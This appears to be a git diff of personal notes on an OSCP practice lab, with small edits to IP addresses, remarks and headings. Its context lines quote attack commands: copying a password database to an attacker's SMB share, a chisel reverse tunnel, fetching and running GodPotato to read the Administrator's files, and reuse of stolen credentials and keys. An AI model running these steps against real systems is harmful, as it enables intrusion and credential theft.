@@ -386,7 +386,7 @@ Nmap done: 1 IP address (1 host up) scanned in 74.45 seconds
 
 ```
 
-2. Find out schedule.ps1 in drive C. Then, read it and found it adding file 'updatecollcto.exe' as scheduled task so, created a useradd.c file and upload it accordingly. 
+2. Find out schedule.ps1 in drive C. Then, read it and found it adding file 'updatecollcto.exe' as scheduled task so, created a useradd.c file and upload it accordingly. (login with andrea creds)
 ```
 ┌──(kali㉿kali)-[~/OSCP/labs/relia]
 └─$ cat adduser.c
@@ -1066,7 +1066,7 @@ PS C:\Windows\System32\WindowsPowerShell\v1.0>
 └─$  python3 /home/kali/impacket/examples/smbserver.py -smb2support myshare . 
 Impacket v0.11.0 - Copyright 2023 Fortra
 
-PS C:\> copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.202\myshare\Database.kdbx
+PS C:\> copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.207\myshare\Database.kdbx
 copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.172\myshare\Database.kdbx
 
 ┌──(kali㉿kali)-[~/OSCP/labs/relia]
@@ -1643,7 +1643,7 @@ LISTEN  0       511                   *:80                  *:*
 2024/02/14 22:25:54 server: Listening on http://0.0.0.0:9000
 2024/02/14 22:26:57 server: session#1: tun: proxy#R:8000=>8000: Listening
 
-anita@demo:~$ ./chisel client 192.168.45.242:9000 R:8000:127.0.0.1:8000 #chiselfixedlistener
+anita@demo:~$ ./chisel client 192.168.45.207:9000 R:8000:127.0.0.1:8000 #chiselfixedlistener
 2024/02/15 03:26:55 client: Connecting to ws://192.168.45.242:9000
 2024/02/15 03:26:58 client: Connected (Latency 384.246827ms)
 ```
@@ -1946,7 +1946,7 @@ iwr -uri http://192.168.45.242/GodPotato-NET4.exe -Outfile GodPotato-NET42.exe
  .\GodPotato-NET42.exe -cmd "cmd /c whoami"
 ```
 
-9. Obtained proof.txt after navigating with godpotato, could not get reverse shell with god potato thought. 
+9. Obtained proof.txt after navigating with godpotato, could not get reverse shell with god potato thought. (sweetpotato gives root)
 ```
 PS C:\xampp\apache\bin>  .\GodPotato-NET42.exe -cmd "cmd /c type C:\users\Administrator\Desktop\proof.txt"
 [*] CombaseModule: 0x140718178304000
@@ -2405,7 +2405,7 @@ found database.kdbx and break it.
 ```
 xfreerdp login with obtained creds. 
 ```
-## 245
+### 245
 ```
 21/tcp   open  ftp          syn-ack                                                80/tcp   open  http         syn-ack                                                443/tcp  open  https        syn-ack                                               2222/tcp open  EtherNetIP-1 syn-ack                                                8000/tcp open  http-alt     syn-ack
 
@@ -2422,7 +2422,7 @@ make
 ./exploit
 proof.txt
 ```
-## 246 
+### 246 
 ```
 sudo ssh -i anita_rsa anita@192.168.207.246 -p 2222
 local.txt 
@@ -2435,7 +2435,7 @@ all:all
 sudo su
 
 ```
-## 247 
+### 247 
 ```
 anita
 
@@ -2443,7 +2443,7 @@ use mark creds from umbraco for foothold
 
 use httpd.exe for priesc, use meterpreter listener and stageless exploit
 ```
-## 248 
+### 248 
 ```
 smbclient 
 
@@ -2453,7 +2453,7 @@ rdp as emma -local
 
 rdp as mark - proof 
 ```
-## 249 
+### 249 
 ```
 /cms
 exploit of ritecms 3.0 
@@ -2462,7 +2462,10 @@ local.txt
 history have damon creds
 impacket-psec login and obtained proof.txt 
 ```
-## 250 
+### 250 
 ```
 win prep
 ```
+
+
+
